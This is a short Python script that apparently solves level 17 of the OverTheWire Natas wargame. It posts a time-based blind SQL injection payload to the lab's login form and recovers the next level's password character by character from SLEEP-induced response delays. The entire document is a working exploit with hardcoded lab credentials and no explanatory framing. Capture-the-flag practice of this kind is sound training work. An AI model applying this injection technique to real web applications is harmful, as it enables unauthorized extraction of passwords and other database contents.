import requests
import datetime
import string

alphabet = list(string.ascii_letters) + list(string.digits)
url = 'http://natas17.natas.labs.overthewire.org/index.php'
usr = 'natas17'
passwd = '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw'
query_beg = 'natas18" AND password LIKE BINARY "'
query_end = '%" AND SLEEP(10); -- "'
password = ''

while len(password) != 32:
    for char in alphabet:
        print(password + char + '\r', end='')
        response = requests.post(url, {'username' : query_beg + password + char + query_end}, auth=(usr, passwd))
        if response.elapsed >= datetime.timedelta(seconds=10):
            password += char
            print(password)
            break
